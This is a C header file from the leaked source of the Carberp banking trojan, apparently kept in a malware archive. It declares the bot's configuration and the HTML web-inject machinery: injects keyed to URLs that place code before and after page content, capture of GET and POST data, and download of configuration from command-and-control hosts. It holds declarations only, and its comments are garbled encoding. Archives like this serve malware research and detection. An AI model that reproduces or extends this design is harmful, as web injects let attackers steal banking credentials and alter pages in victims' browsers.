/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// � ���������� ����������� ���������� �������� �� �������, ��� �
// ������ ������ ���������/���������� HTKL �������� ��������� � ���� ������
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"

// ���� L, ������ ����� ������
//#define MODE_GETTEXT_GET  1   //LG
//#define MODE_GETTEXT_POST 2   //LP
//#define MODE_GETTEXT_ALL  3   //GPL ��� L

// ��� �����, ������ ������
//#define MODE_SETTEXT_GET  4  //G
//#define MODE_SETTEXT_POST 5  //P
//#define MODE_SETTEXT_ALL  6  //GP

#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5

//#define PAGE_READED_FLAG 0x01
//#define PAGE_IS_INJECT   0x05

//#define INJECT_STATE_NONE	 0x01
//#define INJECT_STATE_ALREADY 0x02

#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


DWORD GetConfigTimeOut();
char* GetCurrentHostFromConfig(int Num);
void GetCurrentConfigHostSetings(bool*http, bool*https);


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
//  ������ ��� ������ � ���������������� ������ ����
//
//
//  �����!!!!!! ��������� ����� ������� �������� ������ ��� ����������
//              ����������
//				�������� ��� BV_APP � ����� ������������
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

enum TInjectDataState {idsUnknown, idsOk, idsError};

typedef struct THTMLInjectData
{
	PCHAR Before;
	PCHAR Inject;
	PCHAR After;
	TInjectDataState State;
	bool Disabled;     // �� ������������ ������ (��� ���������� ���������)
	LPVOID Owner;      // ��������� �� ������ �������� ������

}*PHTMLInjectData;


//---------------------------------------------------------
//  THTMLInject - �������� ������ ��� ��������� ������
//                    HTML ���� � ����������� ��������
//---------------------------------------------------------
typedef struct THTMLInject
{
	PCHAR URL;       // ����� ����� ��� �������� ���������� ������������ ��������
	bool GET; 		 // ������������ GET �������
	bool POST;       // ������������ POST �������
	bool IsLog;      // ���������� HTML. ������ ������� ���������� ������ �� ������
	PList Injects;   // ������ �������� (������ ��������� ���� PHTMLInject)
	bool Disabled;   // �� ������������ ������ (��� ���������� ���������)
	bool Used;       // ������� ���� ��� ����� ��������������
	#ifdef BV_APP
		PCHAR Comment;   // ���������� � �������, ������ ��� ���������
	#endif
} *PHTMLInject;


//---------------------------------------------------------
// TBotConfig -  ��������� ������ ����
//---------------------------------------------------------
typedef struct TBotConfig
{
	PList HTMLInjects; // ������ �������� (������ ��������� ���� PHTMLInject)
	PRTL_CRITICAL_SECTION Lock;
} *PBotConfig;



//*********************************************************
//  SetHTMLInjectEvent - ���������� ����� ���������
//		������� HTML �������
//*********************************************************
// �����, ������� HTML �������
#ifdef BV_APP
	enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
	typedef void(*THTMLInjectEvent)(LPVOID Data,        	// ������� � �������� ���������������� �������
									LPVOID Sender, 	    	// �������� �������
									THTMLInjectEventID ID,  // ������������� �������
									LPVOID Reserver);      	// ���������������

	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
#endif

namespace Config
{
	//*********************************************************
	//	Initialize - ���������������� ����������
	//  	��������� ����. ���� ������ ��� ����� FileName ��
	//  	��������� ����� ��������� �� ����, � ���������
	//  	������ ��������� ����� ��������� �� ����� �������
	//		� ��� ����.
	//*********************************************************
	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);

	// ������� ���������� ��������� �� ������ ����
	PBotConfig GetConfig();

	// �������� ������
	void Clear(PBotConfig Config);

	//  ������� ���������� ��� ����� �� ���������
	//
	PWCHAR GetFileName(bool HightPriority = false);

	//  ������� ������������� ��� ����� �� ���������
	void SetFileName(PWCHAR FileName);

	// ��������� ������
	bool Download(PCHAR URL);

	// ������� ���������� ������ ���� ����� �������� ��������
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - �������� ������� ��� �������
	bool GetInjectsForRequest(PRequest Request);
}


//****************************************************************************
//	HTMLInjects - ������ ��� ������ � HTML ���������
//****************************************************************************
namespace HTMLInjects
{
	//*********************************************************
	// ������� ���������� ������ ���� ������ ����� ������������
	// � ��������
	//*********************************************************
	bool IsValidInjectData(PHTMLInjectData Data);


	//*********************************************************
	//  ��������� HTML �������.
	//
	//  ��������� - ������� ���������� ������ ���� � ������
	//              ������� ���� ������� ���������
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// ������� ���������� ������ ���� ��������� ��� ��������
	// �������������� �������� ������� HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  AddInject - �������� ����� HTML ������ � ������
	//		List. ���� ������ �������� Source �� � �����
	//		����� ����������� ��� ��� ������
	//*********************************************************
	PHTMLInject AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData = false);

	//*********************************************************
	//  AddInjectData - �������� ����� ������ �������
	//                      ��������� ������ �������, ������
	//						���� ��������
	//*********************************************************
	PHTMLInjectData AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject);

	//*********************************************************
	//  ResetStatus - �������� ������ ��������
	//*********************************************************
	void ResetStatus(PList Injects);

	//*********************************************************
	//  ClearInjectList - ������� ������� ������ ����������
	//		 			  �������� ���� THTMLInject
	//*********************************************************
	void ClearInjectList(PList List);

	//*********************************************************
	//  ������ ����������� ������ HTML �������
	//*********************************************************
	void FreeInject(PHTMLInject Inject);

}

// -----------------------------------------------------------------------------
#endif
